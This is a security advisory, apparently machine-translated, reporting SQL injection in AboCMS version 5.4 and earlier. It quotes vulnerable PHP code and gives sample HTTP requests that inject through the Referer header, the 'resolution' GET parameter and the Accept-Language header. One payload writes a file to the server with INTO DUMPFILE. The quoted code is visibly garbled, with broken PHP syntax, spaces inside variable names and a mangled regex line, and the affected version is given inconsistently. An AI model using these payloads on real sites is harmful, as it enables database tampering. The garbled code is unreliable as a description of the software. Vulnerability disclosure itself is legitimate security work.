Abo CMS <= 5.4 remote SQL Injection Vulnerabilities 
===================================================

Author: Vladimir Vorontsov
OnSec Russian Security Group 

In the popular content management system AboCMS version 5.2 found a
critical vulnerability. Errors allow an attacker to modify the query syntax
to the database.
It exists because of the lack of data filtering of HTTP headers and data
in the request variables. 

1. Vulnerability in the header data HTTP Referer. 

Exploitation of vulnerability is possible when the option rewrite_mod
settings management system. Vulnerable code: 
 
$ url_info = parse_url ($ _SERVER [ &#039;HTTP_REFERER&#039;]); 
if ($ CONFIG [ &#039;rewrite_mod&#039;]) ( 
| de | frn | eng) \ /? / i", "", $ url_info [ &#039;path&#039;]): ""; 
/ * 
$ amp_pos = strpos ($ link, "&"); 
$ link = FALSE! == $ amp_pos? substr ($ link, 0, $ amp_pos): $ link; 

* / 
if ($ link ==&#039;/&#039;) $ link = null; 
    $ by = &#039;address&#039;; 
) Else ( 
    $ link = array (); 
    parse_str (@ $ url_info [ &#039;query&#039;], $ link); 
    $ link = (@ $ link [ &#039;link&#039;] & & $ link [ &#039;link&#039;]!=&#039;/&#039;)? My_Sql::
escape ($ link [ &#039;link&#039;]):&#039;&#039;; 
    $ by = &#039;link&#039;; 
) 
 
Implementation: 

 
GET http://localhost/c.php HTTP/1.1 
 
Referer: http://asd.asd/&#039;/**/ INTO / ** / dumpfile /**/&#039; C: / onsec.txt &#039; 

 
2. Vulnerability in the variable data resolution request GET. 

 
Vulnerable code: 
 
if (@ $ _GET [ &#039;resolution&#039;]) ( 
$ user_resolution = $ _GET [ &#039;resolution&#039;]; 
) Else ( 
$ user_resolution = &#039;Another&#039;; 
) 
 
Implementation: 

 
GET http://localhost/c.php?resolution = "injection / ** / to / ** / insert


 
3. Vulnerability in the header data HTTP Accept-Language 

 
Vulnerable code: 
 
$ user_lang = $ _SERVER [ &#039;HTTP_ACCEPT_LANGUAGE&#039;]; 
 
Implementation: 

 
GET http://localhost/c.php HTTP 1.1 
 
Accept-language: "injection / ** / to / ** / insert




